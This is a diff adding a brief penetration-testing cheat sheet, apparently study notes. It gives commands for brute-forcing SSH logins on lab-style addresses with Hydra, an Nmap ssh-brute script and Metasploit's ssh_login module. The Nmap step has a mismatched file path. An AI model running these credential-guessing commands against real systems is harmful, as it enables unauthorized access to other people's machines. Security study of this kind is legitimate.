@@ -1,0 +1,52 @@
+# SSH ENUMERATION - PART 2
+
+---------------------------------------------------------------
+
+### Brute SSH login using HYDRA
+
+> hydra -L userfile.txt -P userpass.txt 10.10.10.10 ssh
+
+- L : users' file
+- P : Passwords' file
+- ssh : protocol
+
+---------------------------------------------------------------
+
+### Brute SSH login using NMAP
+
+> echo "administrator" > users.txt
+> nmap -p 22 --script ssh-brute --script-args userdb=/root/users .txt 192.40.231.3
+
+
+---------------------------------------------------------------
+
+### Brute SSH login using METASPLOIT
+
+> - msfconsole
+> - use auxiliary/scanner/ssh/ssh_login
+> - set RHOSTS 192.40.231.3
+> - set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+> - set STOP_ON_SUCCESS true
+> - set verbose true
+> - exploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
